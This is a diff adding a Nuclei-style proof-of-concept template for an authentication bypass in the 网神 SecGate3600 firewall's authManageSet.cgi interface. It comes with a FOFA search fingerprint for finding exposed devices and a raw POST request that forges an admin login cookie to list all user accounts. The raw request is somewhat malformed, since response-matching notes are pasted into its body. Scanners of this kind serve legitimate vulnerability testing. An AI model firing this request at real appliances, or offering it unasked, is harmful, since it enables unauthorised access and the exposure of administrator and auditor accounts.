@@ -1,0 +1,45 @@
+id: poc-akg5coed167kpq5g
+info:
+  name: 网神 SecGate3600 authManageSet.cgi 接口登录绕过
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/akg5coed167kpq5g'
+  tags: unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: akg5coed167kpq5g
+    fofa: body="sec_gate_image/login_02.gif"
+http:
+- raw:
+  - 'POST /cgi-bin/authUser/authManageSet.cgi HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+    Cookie: sw_login_name=admin
+
+
+
+
+    type=getAllUsers&_search=false&nd=1645000391264&rows=-1&page=1&sidx=&sord=asc
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    ^(?=.*?(?:管理员|审计员)).*?$
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
